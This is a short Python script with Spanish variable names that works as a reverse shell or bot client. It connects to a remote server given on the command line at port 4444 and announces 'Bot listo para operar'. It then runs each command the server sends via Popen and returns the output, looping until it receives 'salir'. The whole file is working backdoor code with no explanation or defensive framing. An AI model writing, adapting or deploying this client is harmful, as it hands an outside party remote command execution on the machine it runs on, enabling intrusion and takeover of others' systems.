import sys
from subprocess import Popen, PIPE
from socket import *

nombreServidor = sys.argv[1]
puertoServidor = 4444
socketCliente = socket(AF_INET, SOCK_STREAM)
socketCliente.connect((nombreServidor, puertoServidor))
socketCliente.send('Bot listo para operar'.encode())
comando = socketCliente.recv(4062).decode()
while comando != "salir":
	proceso = Popen(comando.split(" "), stdout=PIPE, stderr=PIPE)
	resultado, err = proceso.communicate()
	socketCliente.send(resultado)
	comando = (socketCliente.recv(4064)).decode()

socketCliente.close()

